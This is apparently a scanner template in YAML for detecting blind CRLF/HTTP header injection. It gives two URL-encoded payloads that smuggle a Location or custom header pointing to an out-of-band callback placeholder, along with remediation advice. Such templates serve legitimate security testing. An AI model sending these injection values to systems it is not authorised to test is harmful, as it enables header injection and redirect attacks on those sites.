id: crlf-oob
name: CRLF / HTTP header injection (blind, OAST-confirmed)
family: crlf
severity: medium
cwe: CWE-93
owasp: WSTG-INPV-16
inject_into: [query]
payloads:
  # URL-encoded CRLF that smuggles a Location header when the server reflects the
  # param into a response header. (Raw CR/LF in request headers is blocked client-side.)
  - "%0d%0aLocation:%20http://{{oast_domain}}/"
  - "%0d%0aX-Injected:%20http://{{oast_domain}}/{{oast_token}}"
oracle:
  type: any_of
  checks:
    - type: oob
confirm_reproducible: false
remediation: >-
  Strip or reject CR/LF (and their encoded forms) from any user input placed
  into HTTP headers or response metadata. Use framework APIs that encode header
  values rather than concatenating them.
